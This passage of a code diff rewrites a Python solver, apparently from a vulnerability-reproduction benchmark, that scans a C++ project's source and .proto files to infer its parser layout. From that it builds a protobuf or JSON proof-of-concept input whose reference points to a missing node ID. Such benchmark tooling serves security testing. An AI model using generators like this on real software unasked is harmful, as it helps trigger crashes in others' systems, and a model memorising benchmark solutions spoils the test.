-
-def _find_packet_field_in_trace(schema: ProtoSchema, trace_full: str, packet_full: str) -> Optional[FieldDef]:
-    md = schema.messages.get(trace_full)
-    if not md:
+        for m in re.finditer(r"\b([A-Za-z_]\w*)\s*\.\s*ParseFrom(Array|String)\s*\(", t):
+            var = m.group(1)
+            pre = t[max(0, m.start() - 4000): m.start()]
+            decl = re.search(r"([A-Za-z_][A-Za-z0-9_:]*)\s+" + re.escape(var) + r"\s*;", pre)
+            if decl:
+                typ = decl.group(1)
+                typ = typ.split("::")[-1]
+                typ = re.sub(r"[^A-Za-z0-9_]", "", typ)
+                if typ:
+                    root_type = typ
+                    break
+        if root_type:
+            break
+    if not root_type:
         return None
-    # prefer repeated field named packet
-    for f in md.fields:
-        if f.label == "repeated" and f.name.lower() == "packet":
-            child = schema.resolve_message(f.type_name)
-            if child == packet_full:
-                return f
-    # any repeated message of type TracePacket
-    for f in md.fields:
-        if f.label == "repeated":
-            child = schema.resolve_message(f.type_name)
-            if child == packet_full:
-                return f
-    # any field named packet
-    for f in md.fields:
-        if f.name.lower() == "packet":
-            child = schema.resolve_message(f.type_name)
-            if child == packet_full:
-                return f
-    return None
+    info["root_type"] = root_type
 
-
-def _make_trace_bytes(schema: ProtoSchema, trace_full: str, packet_full: str, packet_bytes: bytes) -> Optional[bytes]:
-    md = schema.messages.get(trace_full)
-    if not md:
+    nm_text = ""
+    for fp in node_map_files or parse_files:
+        nm_text = texts.get(fp, "")
+        if nm_text:
+            break
+    if not nm_text:
         return None
-    packet_field = _find_packet_field_in_trace(schema, trace_full, packet_full)
-    if not packet_field:
+
+    m_id = re.search(r"node_id_map\s*(?:\[\s*|\.\s*(?:emplace|insert)\s*\(\s*)([A-Za-z_]\w*)\s*\.\s*([A-Za-z_]\w*)\s*\(\s*\)", nm_text)
+    if m_id:
+        node_var = m_id.group(1)
+        id_acc = m_id.group(2)
+        info["node_var"] = node_var
+        info["node_id_accessor"] = id_acc
+
+        pre = nm_text[:m_id.start()]
+        fm = None
+        for mm in re.finditer(r"for\s*\(\s*[^:]*\b" + re.escape(node_var) + r"\b\s*:\s*([A-Za-z_]\w*)\s*\.\s*([A-Za-z_]\w*)\s*\(\s*\)\s*\)", pre):
+            fm = mm
+        if fm:
+            info["snapshot_var"] = fm.group(1)
+            info["nodes_accessor"] = fm.group(2)
+
+    m_ref = re.search(r"node_id_map\s*\.\s*find\s*\(\s*([A-Za-z_]\w*)\s*\.\s*([A-Za-z_]\w*)\s*\(\s*\)\s*\)", nm_text)
+    if m_ref:
+        ref_var = m_ref.group(1)
+        ref_acc = m_ref.group(2)
+        info["ref_var"] = ref_var
+        info["ref_id_accessor"] = ref_acc
+
+        pre = nm_text[:m_ref.start()]
+        fm = None
+        for mm in re.finditer(r"for\s*\(\s*[^:]*\b" + re.escape(ref_var) + r"\b\s*:\s*([A-Za-z_]\w*)\s*\.\s*([A-Za-z_]\w*)\s*\(\s*\)\s*\)", pre):
+            fm = mm
+        if fm:
+            info["snapshot_var_refs"] = fm.group(1)
+            info["refs_accessor"] = fm.group(2)
+
+    if "nodes_accessor" not in info or "refs_accessor" not in info or "node_id_accessor" not in info or "ref_id_accessor" not in info:
         return None
-    # encode trace as: repeated packet = packet_bytes
-    out = bytearray()
-    out.extend(_encode_key(packet_field.number, 2))
-    out.extend(_encode_len_delim(packet_bytes))
-    return bytes(out)
+
+    return info
 
 
-def _make_json_fallback(root: str) -> bytes:
-    # Heuristic: attempt to infer key strings from relevant source file
+def _infer_json_wrapper(text: str) -> Optional[str]:
     keys = set()
-    for p in _iter_source_files(root):
-        txt = _read_text(p, 500_000)
-        if "node_id_map" not in txt:
-            continue
-        for m in re.finditer(r'\["([A-Za-z_]\w*)"\]', txt):
-            keys.add(m.group(1))
-        for m in re.finditer(r"get\(\s*\)\s*;.*?\b([A-Za-z_]\w*)\b", txt):
-            pass
+    keys.update(re.findall(r'FindMember\s*\(\s*"([^"]+)"\s*\)', text))
+    keys.update(re.findall(r'\[\s*"([^"]+)"\s*\]', text))
+    wrapper_candidates = ["snapshot", "memory_snapshot", "mem_snapshot", "data", "payload", "root", "graph", "snapshotData", "snapshot_data"]
+    if "nodes" in keys and "snapshot" in keys:
+        return "snapshot"
+    for c in wrapper_candidates:
+        if c in keys and "nodes" in keys:
+            return c
+    if "snapshot" in keys:
+        return "snapshot"
+    if "memory_snapshot" in keys:
+        return "memory_snapshot"
+    return None
 
-    # Use common keys; add inferred ones as extras
-    payload = {
-        "nodes": [
-            {
-                "id": 1,
-                "node_id": 1,
-                "object_id": 1,
-                "refs": [2],
-                "ref_ids": [2],
-                "references": [{"id": 2}, {"node_id": 2}, {"to": 2}, {"target": 2}],
-                "edges": [{"to": 2}, {"target": 2}],
-            }
-        ],
-        "edges": [{"from": 1, "to": 2}, {"src": 1, "dst": 2}, {"source": 1, "target": 2}],
-        "pid": 1,
-        "timestamp": 1,
-        "version": 1,
-    }
-    # sprinkle inferred keys at top-level, harmless
-    for k in list(keys)[:20]:
-        if k not in payload:
-            payload[k] = 1
 
+def _make_json_poc(wrapper: Optional[str]) -> bytes:
     import json
-    return json.dumps(payload, separators=(",", ":")).encode("utf-8")
+    core = {
+        "nodes": [{"id": 1, "node_id": 1}],
+        "edges": [{"from": 1, "to": 2, "node_id": 2}],
+        "references": [{"from": 1, "to": 2, "node_id": 2}],
+    }
+    payload = {wrapper: core} if wrapper else core
+    return json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
+        root_dir = None
+        tmpdir_obj = None
         try:
-            with tarfile.open(src_path, "r:*") as tf:
-                tf.extractall(tmpdir)
+            if os.path.isdir(src_path):
+                root_dir = src_path
+            else:
+                tmpdir_obj = tempfile.TemporaryDirectory()
+                root_dir = tmpdir_obj.name
+                with tarfile.open(src_path, "r:*") as tar:
+                    _safe_extract_tar(tar, root_dir)
 
-            # pick likely root directory
-            entries = [os.path.join(tmpdir, x) for x in os.listdir(tmpdir)]
-            dirs = [d for d in entries if os.path.isdir(d)]
-            root = tmpdir
-            if len(dirs) == 1:
-                root = dirs[0]
+            files = _iter_source_files(root_dir)
+            texts, node_map_files, fuzzer_files = _find_relevant_texts(files)
 
-            schema = ProtoSchema.from_dir(root)
-            if not schema.messages:
-                return _make_json_fallback(root)
+            wants_json = False
+            for fp in (node_map_files + fuzzer_files):
+                t = texts.get(fp, "")
+                tl = t.lower()
+                if "rapidjson" in tl or "nlohmann" in tl or "json::parse" in tl or "document.parse" in tl:
+                    wants_json = True
+                    break
 
-            clues = _find_clue_message_names(root)
-            target_full = _choose_best_target_message(schema, clues)
-            if not target_full:
-                return _make_json_fallback(root)
-
-            trace_full = schema.find_by_simple("Trace")
-            packet_full = schema.find_by_simple("TracePacket")
-
-            root_pref = _detect_root_preference(root)
-
-            # If no TracePacket, try to find any "*Packet" message
-            if not packet_full:
-                for simple, fulls in schema.simple_index.items():
-                    if simple.endswith("Packet"):
-                        packet_full = fulls[0]
+            has_proto = any(p.endswith(".proto") for p in files)
+            wants_protobuf = False
+            if has_proto:
+                for fp in (fuzzer_files or files):
+                    t = texts.get(fp)
+                    if t is None:
+                        t = _read_text_file(fp)
+                        texts[fp] = t
+                    if ".ParseFromArray" in t or ".ParseFromString" in t:
+                        wants_protobuf = True
                         break
 
-            # Create packet bytes if possible (either TracePacket or target itself)
-            packet_bytes = b""
-            if packet_full:
-                packet_values = _make_wrapped_packet(schema, packet_full, target_full)
-                packet_bytes = _encode_message(schema, packet_full, packet_values)
-            else:
-                # no packet wrapper; use target message directly
-                packet_bytes = _encode_message(schema, target_full, _make_target_payload(schema, target_full))
+            if wants_protobuf:
+                info = _infer_from_code_for_protobuf(texts, node_map_files, fuzzer_files)
+                if info:
+                    proto_paths = [p for p in files if p.endswith(".proto")]
+                    schema = _parse_proto_files(proto_paths)
 
-            # Create trace bytes if possible
-            trace_bytes = None
-            if trace_full and packet_full and packet_bytes:
-                trace_bytes = _make_trace_bytes(schema, trace_full, packet_full, packet_bytes)
+                    root_full = schema.resolve_message(info["root_type"]) or info["root_type"]
+                    root_fields = schema.messages.get(root_full)
+                    if root_fields:
+                        nodes_field = root_fields.get(info["nodes_accessor"])
+                        refs_field = root_fields.get(info["refs_accessor"])
+                        if nodes_field and refs_field:
+                            node_msg_full = schema.resolve_message(nodes_field.type)
+                            ref_msg_full = schema.resolve_message(refs_field.type)
+                            if node_msg_full and ref_msg_full:
+                                node_fields = schema.messages.get(node_msg_full, {})
+                                ref_fields = schema.messages.get(ref_msg_full, {})
 
-            # Robust polyglot between Trace and TracePacket:
-            # return (Trace(packet=...)) + (raw TracePacket) to satisfy either root parser.
-            if trace_bytes and packet_bytes:
-                if root_pref == "TracePacket":
-                    return trace_bytes + packet_bytes
-                if root_pref == "Trace":
-                    return trace_bytes + packet_bytes
-                # unknown: still return combined
-                return trace_bytes + packet_bytes
+                                node_vals: Dict[str, Any] = {}
+                                if info["node_id_accessor"] in node_fields:
+                                    node_vals[info["node_id_accessor"]] = 1
+                                else:
+                                    for k in node_fields.keys():
+                                        if k.endswith("id"):
+                                            node_vals[k] = 1
+                                            break
+                                for k, f in node_fields.items():
+                                    if f.label == "required" and k not in node_vals and f.type in _SCALAR_TYPES:
+                                        node_vals[k] = 0
 
-            if root_pref == "TracePacket" and packet_bytes:
-                return packet_bytes
+                                ref_vals: Dict[str, Any] = {}
+                                if info["ref_id_accessor"] in ref_fields:
+                                    ref_vals[info["ref_id_accessor"]] = 2
+                                else:
+                                    for k in ref_fields.keys():
+                                        if "target" in k and k.endswith("id"):
+                                            ref_vals[k] = 2
+                                            break
+                                    if not ref_vals:
+                                        for k in ref_fields.keys():
+                                            if k.endswith("id"):
+                                                ref_vals[k] = 2
+                                                break
+                                for k in ref_fields.keys():
+                                    if k in ref_vals:
+                                        continue
+                                    if k.endswith("id") and ("from" in k or "source" in k or "src" in k or "origin" in k or "parent" in k):
+                                        ref_vals[k] = 1
+                                for k, f in ref_fields.items():
+                                    if f.label == "required" and k not in ref_vals and f.type in _SCALAR_TYPES:
+                                        ref_vals[k] = 0
 
-            if trace_bytes:
-                return trace_bytes
+                                root_vals: Dict[str, Any] = {
+                                    info["nodes_accessor"]: [node_vals],
+                                    info["refs_accessor"]: [ref_vals],
+                                }
+                                for k, f in root_fields.items():
+                                    if f.label == "required" and k not in root_vals and f.type in _SCALAR_TYPES:
+                                        root_vals[k] = 0
 
-            if packet_bytes:
-                return packet_bytes
+                                pb = _encode_message(schema, root_full, root_vals)
+                                if pb:
+                                    return pb
 
-            return _make_json_fallback(root)
+            wrapper = None
+            nm_text = texts.get(node_map_files[0], "") if node_map_files else ""
+            if nm_text:
+                wrapper = _infer_json_wrapper(nm_text)
+            if not wrapper and fuzzer_files:
+                wrapper = _infer_json_wrapper(texts.get(fuzzer_files[0], ""))
+
+            return _make_json_poc(wrapper)
+
         finally:
-            shutil.rmtree(tmpdir, ignore_errors=True)
+            if tmpdir_obj is not None:
+                try:
+                    tmpdir_obj.cleanup()
+                except Exception:
+                    pass
